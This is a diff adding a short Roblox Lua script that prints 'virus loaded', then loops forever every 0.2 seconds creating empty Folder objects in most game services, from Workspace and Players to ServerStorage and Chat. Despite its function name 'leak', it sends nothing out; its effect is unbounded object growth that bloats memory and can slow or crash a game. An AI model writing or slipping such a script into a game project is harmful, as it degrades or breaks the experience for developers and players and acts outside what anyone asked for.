@@ -1,0 +1,23 @@
+print("virus loaded")
+print("permission == true")
+
+function leak()
+  local OBJ = Instance.new("Folder", game.Workspace)
+  local OBJs = Instance.new("Folder", game.Players)
+  local OBJc = Instance.new("Folder", game.Lighting)
+  local OBJx = Instance.new("Folder", game.ReplicatedFirst)
+  local OBJn = Instance.new("Folder", game.ReplicatedStorage)
+  local OBg = Instance.new("Folder", game.ServerScriptService)
+  local OBJu = Instance.new("Folder", game.ServerStorage)
+  local OBJj = Instance.new("Folder", game.StarterGui)
+  local OBJt = Instance.new("Folder", game.StarterPack)
+  local OBk = Instance.new("Folder", game.StarterPlayer)
+  local OBJb = Instance.new("Folder", game.Teams)
+  local OBJe = Instance.new("Folder", game.SoundService)
+  local OBJq = Instance.new("Folder", game.Chat)
+  local OBJ = Instance.new("Folder", game.TestService)
+end
+
+while wait(0.2) do
+  leak()
+end
